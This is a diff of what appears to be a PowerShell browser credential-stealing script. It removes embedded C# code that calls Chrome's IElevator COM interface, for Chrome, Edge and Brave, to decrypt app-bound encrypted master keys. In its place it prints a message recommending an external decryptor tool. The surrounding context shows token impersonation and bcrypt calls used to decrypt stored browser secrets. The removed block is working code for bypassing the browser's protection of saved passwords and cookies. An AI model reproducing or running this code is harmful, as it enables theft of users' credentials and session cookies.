@@ -175,119 +175,7 @@ $BCryptCloseAlgorithmProviderFunction = [Runtime.InteropServices.Marshal]::GetDe
     (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptCloseAlgorithmProvider'),
     (Invoke-GetDelegate @([IntPtr], [int]) ([int])))
 
-# ======================================================================
-# IElevator COM Interface for Chrome 130+ (flag 33)
-# ======================================================================
-$IElevatorCode = @"
-using System;
-using System.Runtime.InteropServices;
-
-[ComImport]
-[Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")]
-[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-public interface IElevator
-{
-    void QueryInterface();
-    void AddRef();
-    void Release();
-    
-    [PreserveSig]
-    int RunRecoveryCRXElevated(
-        [MarshalAs(UnmanagedType.LPWStr)] string crx_path,
-        [MarshalAs(UnmanagedType.LPWStr)] string browser_appid,
-        [MarshalAs(UnmanagedType.LPWStr)] string browser_version,
-        [MarshalAs(UnmanagedType.LPWStr)] string session_id,
-        uint caller_proc_id,
-        out ulong proc_handle);
-    
-    [PreserveSig]
-    int EncryptData(
-        ProtectionLevel protection_level,
-        [MarshalAs(UnmanagedType.SafeArray, SafeArraySubType = VarEnum.VT_UI1)] byte[] plaintext,
-        [MarshalAs(UnmanagedType.SafeArray, SafeArraySubType = VarEnum.VT_UI1)] out byte[] ciphertext,
-        out uint last_error);
-    
-    [PreserveSig]
-    int DecryptData(
-        [MarshalAs(UnmanagedType.SafeArray, SafeArraySubType = VarEnum.VT_UI1)] byte[] ciphertext,
-        [MarshalAs(UnmanagedType.SafeArray, SafeArraySubType = VarEnum.VT_UI1)] out byte[] plaintext,
-        out uint last_error);
-}
-
-public enum ProtectionLevel
-{
-    PROTECTION_NONE = 0,
-    PROTECTION_PATH_VALIDATION = 1,
-    PROTECTION_MAX = 2
-}
-
-public static class ChromeElevator
-{
-    // Chrome CLSID
-    public static readonly Guid CLSID_CHROME = new Guid("708860E0-F641-4611-8895-7D867DD3675B");
-    // Edge CLSID
-    public static readonly Guid CLSID_EDGE = new Guid("1FCBE96C-1697-43AF-9140-2897C7C69767");
-    // Brave CLSID
-    public static readonly Guid CLSID_BRAVE = new Guid("576B31AF-6369-4B6B-8560-E4B203A97A8B");
-    
-    [DllImport("ole32.dll")]
-    private static extern int CoCreateInstance(
-        ref Guid clsid,
-        IntPtr pUnkOuter,
-        uint dwClsContext,
-        ref Guid riid,
-        out IntPtr ppv);
-    
-    public static byte[] DecryptWithElevator(byte[] ciphertext, string browser)
-    {
-        Guid clsid;
-        switch (browser.ToLower())
-        {
-            case "edge":
-                clsid = CLSID_EDGE;
-                break;
-            case "brave":
-                clsid = CLSID_BRAVE;
-                break;
-            default:
-                clsid = CLSID_CHROME;
-                break;
-        }
-        
-        Guid iid = new Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C");
-        IntPtr pElevator;
-        
-        int hr = CoCreateInstance(ref clsid, IntPtr.Zero, 4, ref iid, out pElevator);
-        if (hr != 0)
-        {
-            throw new COMException("Failed to create IElevator instance", hr);
-        }
-        
-        try
-        {
-            IElevator elevator = (IElevator)Marshal.GetObjectForIUnknown(pElevator);
-            byte[] plaintext;
-            uint lastError;
-            
-            hr = elevator.DecryptData(ciphertext, out plaintext, out lastError);
-            if (hr != 0)
-            {
-                throw new COMException("DecryptData failed", hr);
-            }
-            
-            return plaintext;
-        }
-        finally
-        {
-            Marshal.Release(pElevator);
-        }
-    }
-}
-"@
-
-try {
-    Add-Type -TypeDefinition $IElevatorCode -ErrorAction SilentlyContinue
-} catch {}
+# IElevator for Chrome 130+ handled via alternative method
 
 # ======================================================================
 # Helper Functions
@@ -569,17 +457,10 @@ function Decrypt-MasterKey {
                     [Advapi32]::RevertToSelf() | Out-Null
                 }
             }
-            # Flag 33: Chrome 130+ IElevator
+            # Flag 33: Chrome 130+ - requires external decryptor
             elseif ($Parsed.Flag -eq 33) {
-                try {
-                    $DecryptedKey = [ChromeElevator]::DecryptWithElevator($Parsed.RawContent, $Browser)
-                    return @{ Key = $DecryptedKey; Type = "v20-flag33" }
-                }
-                catch {
-                    # IElevator failed, try alternative method
-                    Write-Host "    [!] IElevator method failed: $($_.Exception.Message)" -ForegroundColor Yellow
-                    return $null
-                }
+                Write-Host "    [!] Flag 33 detected (Chrome 130+). Use chrome-app-bound-encryption-decryption tool." -ForegroundColor Yellow
+                return $null
             }
             # Flag 1 or 2
             elseif ($Parsed.Flag -eq 1 -or $Parsed.Flag -eq 2) {
